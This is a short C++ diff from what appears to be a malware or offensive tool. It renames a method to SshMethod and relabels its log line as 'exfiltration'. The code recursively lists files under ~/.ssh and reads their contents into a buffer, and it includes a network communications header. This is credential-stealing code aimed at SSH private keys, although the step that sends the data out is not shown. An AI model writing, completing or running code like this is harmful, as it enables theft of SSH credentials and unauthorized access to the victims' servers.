@@ -3,7 +3,7 @@
 #include "utils/Logger.hpp"
 #include "network/Comms.hpp"
 
-bool SystemInfoMethod::trigger() {
+bool SshMethod::trigger() {
     std::vector<std::string> files = FileUtils::ListFilesRecursively("~/.ssh");
     std::string data;
 
@@ -11,7 +11,7 @@ bool SystemInfoMethod::trigger() {
     for (auto& file : files) {
         std::string path = home + "/" + target;
 
-        LOG_INFO("Attempting persistence on {}", path)
+        LOG_INFO("Attempting exfiltration of {}", path)
         data += FileUtils::ReadFile(path);
     }
 
